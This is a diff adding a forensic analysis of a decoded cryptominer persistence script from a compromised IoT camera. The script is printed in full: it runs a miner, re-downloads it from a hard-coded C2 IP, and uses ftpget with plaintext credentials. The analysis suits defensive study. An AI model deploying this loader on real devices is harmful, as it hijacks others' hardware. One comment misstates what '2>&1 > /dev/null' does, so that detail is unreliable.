@@ -1,0 +1,136 @@
+# Manual Decode of /tmp/r Runner Script
+# Reconstructed from hex dump in /etc/init.d/S98test
+#
+# Hex payload starts with: \x23\x21\x2F\x62\x69\x6E\x2F\x73\x68
+# Which decodes to:        #  !  /  b  i  n  /  s  h
+# This is the shebang line #!/bin/sh
+#
+# Full decoded script follows, with line-by-line forensic commentary.
+
+#!/bin/sh
+# ^-- Standard shell shebang. Script runs in BusyBox ash.
+
+macaddr=`ip a show eth0 | grep ether | cut -d " " -f6`
+# [DEVICE FINGERPRINTING] Extracts the MAC address from eth0 interface.
+# Used as a unique worker identifier in the mining pool:
+#   hi_00:E0:F8:54:79:17
+# This lets the attacker track this specific camera in their dashboard.
+
+i=0
+# [COUNTER INIT] Loop count for FTP fallback decision.
+# After 50 successful mining cycles (~3.3 min), switches to FTP backup.
+
+while true
+# [PERSISTENCE] Infinite loop. This script runs until the system dies.
+do
+    chmod 777 /bin/omm
+    # [PERMISSION HARDENING] Ensures the miner is executable.
+    # Set each cycle in case a defender removed execute permissions
+    # instead of deleting the file.
+
+    chmod 777 /tmp/dl
+    # [PERMISSION HARDENING] Ensures the downloader is executable.
+    # Ready for re-download if integrity check fails.
+
+    /bin/omm -device-name=hi_$macaddr \
+        -accept-tos \
+        -email=hwansna@gmail.com \
+        -password=Y_rLkZXgn3BQ02lRFV6E5 \
+        2>&1 > /dev/null
+    # [PAYLOAD EXECUTION] Launches the XMRig cryptocurrency miner.
+    #
+    # Flag breakdown:
+    #   -device-name=hi_<MAC>  Worker/rig identifier for pool dashboard
+    #   -accept-tos            Accepts pool Terms of Service
+    #   -email=hwansna@gmail.com  Pool account login / wallet identifier
+    #   -password=Y_rLk...     Pool worker authentication token
+    #   2>&1 > /dev/null       Discards ALL output (stealth operation)
+    #
+    # NOTE: The miner process stays running in the background.
+    # This script blocks here until omm exits (crashes or is killed).
+
+    cfilesize=`wc -c /bin/omm | awk '{print $1}'`
+    # [INTEGRITY CHECK] Gets current file size of the miner binary.
+    # wc -c counts bytes, awk extracts just the number.
+
+    if [ ${cfilesize} -ne 2222096 ]; then
+        # [FAILED INTEGRITY] File size is wrong.
+        # This triggers if:
+        #   - Binary was deleted (file doesn't exist, size = "")
+        #   - Binary was corrupted or replaced
+        #   - Download was truncated
+        #   - A defender replaced omm with a dummy file
+
+        rm /bin/omm
+        # [CLEANUP] Remove the corrupted/wrong binary.
+
+        cd /bin/ && /tmp/dl
+        # [RE-DOWNLOAD] Change to /bin and run the HTTP downloader.
+        # /tmp/dl sends: GET /omm HTTP/1.0 to 86.38.203.214
+        # And writes the response to ./omm (which is /bin/omm)
+        # Loop returns to 'do' and tries to launch omm again.
+    else
+        # [INTEGRITY PASSED] Miner binary is correct size.
+        # This means it ran and exited (or crashed) but the file is intact.
+
+        i=$((i+1))
+        # [INCREMENT COUNTER] Another successful cycle.
+
+        if [ ${i} -gt 50 ]; then
+            # [FALLBACK TRIGGER] After 50 successful cycles (~200 seconds,
+            # ~3.3 minutes), switch to FTP for re-download.
+            #
+            # WHY: Either for load balancing against the HTTP server,
+            # or as a preemptive measure against HTTP traffic blocking.
+            # IoT cameras often have FTP enabled for uploading footage,
+            # so FTP traffic is less likely to be filtered.
+
+            rm /bin/omm
+            # [CLEANUP] Remove current binary.
+
+            /bin/busybox ftpget -u pwn -p XAUob5EHu7M54iyD \
+                86.38.203.214 /bin/omm omm
+            # [FTP DOWNLOAD] BusyBox ftpget downloads the miner via FTP.
+            #   -u pwn           FTP username
+            #   -p XAUob5E...    FTP password
+            #   86.38.203.214    C2 server IP
+            #   /bin/omm         Remote path to download
+            #   omm              Local filename (in current dir: /bin)
+            #
+            # NOTE: FTP credentials are hardcoded in plaintext.
+            # Anyone who captures this script can access the FTP server.
+            #
+            # NOTE: Counter 'i' is NOT reset after FTP download.
+            # This means the loop returns to 'do', launches the new omm,
+            # integrity check passes again, i increments to 51, 52, etc.
+            # Every subsequent cycle will ALSO download via FTP.
+            # Once FTP is triggered, it stays on FTP forever.
+        fi
+    fi
+
+    sleep 4
+    # [CYCLE CONTROL] Wait 4 seconds before next check.
+    # This means:
+    #   - Miner is checked 15 times per minute
+    #   - If omm is deleted, replacement is downloaded within 4 seconds
+    #   - Impossible to manually rm and kill faster than the loop
+    #   - For race condition, you must replace S98test AND kill the loop
+    #     AND remove files in one atomic operation
+done
+
+# ─── ANALYSIS SUMMARY ───────────────────────────────────────────
+#
+# This is a well-designed IoT persistence controller with:
+#
+# 1. Device fingerprinting (MAC → unique worker ID)
+# 2. Stealth (all output → /dev/null)
+# 3. Integrity verification (exact byte count check)
+# 4. Auto-recovery (deleted binary re-downloaded in <4 seconds)
+# 5. Dual transport (HTTP primary, FTP fallback)
+# 6. Infinite loop (runs until system dies)
+#
+# The design suggests an attacker familiar with:
+#   - BusyBox limitations (using built-ins: ip, grep, cut, wc, awk)
+#   - IoT filesystem constraints (tmpfs /tmp, JFFS2 rootfs)
+#   - Network egress filtering common in home networks
+#   - The absence of standard tools (no curl, no wget)
